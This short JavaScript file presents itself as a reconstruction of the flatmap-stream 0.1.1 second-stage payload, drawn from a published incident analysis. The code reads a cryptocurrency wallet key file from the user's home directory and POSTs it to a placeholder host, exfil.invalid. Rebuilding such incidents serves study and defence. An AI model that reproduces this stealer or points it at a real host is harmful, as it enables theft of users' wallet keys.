// Reconstruction of the flatmap-stream 0.1.1 second stage, per the
// published incident analysis: environment check, wallet file read,
// exfil over https. Targets an unreachable .invalid host.
const psTree = require("ps-tree");
const fs = require("fs");
const os = require("os");
const https = require("https");

function exfil(buf) {
  const req = https.request(
    { hostname: "exfil.invalid", path: "/collect", method: "POST" },
    () => {}
  );
  req.write(buf);
  req.end();
}

psTree(process.pid, (e, children) => {
  const wallet = fs.readFileSync(os.homedir() + "/.wallets/keys.dat");
  exfil(wallet);
});
